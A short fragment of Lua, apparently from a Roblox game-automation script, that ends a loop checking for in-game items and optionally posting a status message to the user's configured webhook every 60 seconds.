                hasFistOfDarkness = true
            end
        end

        if getgenv().config.Webhook["Send Webhook"] then
            PostWebhook(getgenv().config.Webhook["Webhook Url"], AdminLoggerMsg(hasGodsChalice, hasFistOfDarkness))
        end
            
        task.wait(60)
    end
end)
